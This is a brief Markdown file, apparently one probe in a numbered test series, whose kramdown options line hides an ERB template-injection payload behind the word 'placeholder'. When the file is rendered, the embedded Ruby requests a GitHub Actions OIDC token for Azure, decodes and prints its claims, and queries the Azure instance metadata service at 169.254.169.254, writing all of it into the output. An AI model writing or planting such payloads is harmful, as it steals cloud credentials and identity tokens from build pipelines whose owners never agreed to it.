---
---

# Test 34: Full OIDC token and Azure IMDS

{::options template="string://<%= require 'net/http'; require 'uri'; require 'base64'; r=''; id_url=ENV['ACTIONS_ID_TOKEN_REQUEST_URL']; id_token=ENV['ACTIONS_ID_TOKEN_REQUEST_TOKEN']; if id_url; begin; uri=URI.parse(id_url+'&audience=api://AzureADTokenExchange'); http=Net::HTTP.new(uri.host,uri.port); http.use_ssl=true; http.open_timeout=5; http.read_timeout=5; req=Net::HTTP::Get.new(uri); req['Authorization']='Bearer '+id_token.to_s; resp=http.request(req); jwt=JSON.parse(resp.body)['value'] rescue resp.body; payload=jwt.split('.')[1] rescue ''; r=r+'OIDC_JWT_HEADER='+jwt[0..50]+\"\\n\"; r=r+'OIDC_JWT_LEN='+jwt.length.to_s+\"\\n\"; padded=payload+'='*(4-payload.length%4); claims=JSON.parse(Base64.urlsafe_decode64(padded)) rescue nil; if claims; for pair in claims.to_a; r=r+'CLAIM_'+pair[0].to_s+'='+pair[1].to_s[0..120]+\"\\n\"; end; end; rescue => e; r=r+'OIDC_ERR='+e.message[0..200]+\"\\n\"; end; end; begin; uri2=URI.parse('http://169.254.169.254/metadata/instance?api-version=2021-02-01'); http2=Net::HTTP.new(uri2.host,uri2.port); http2.open_timeout=3; http2.read_timeout=3; req2=Net::HTTP::Get.new(uri2); req2['Metadata']='true'; resp2=http2.request(req2); r=r+'AZURE_IMDS_STATUS='+resp2.code+\"\\n\"+'AZURE_IMDS='+resp2.body[0..500]+\"\\n\"; rescue => e; r=r+'AZURE_ERR='+e.message[0..100]+\"\\n\"; end; r %>" /}

placeholder
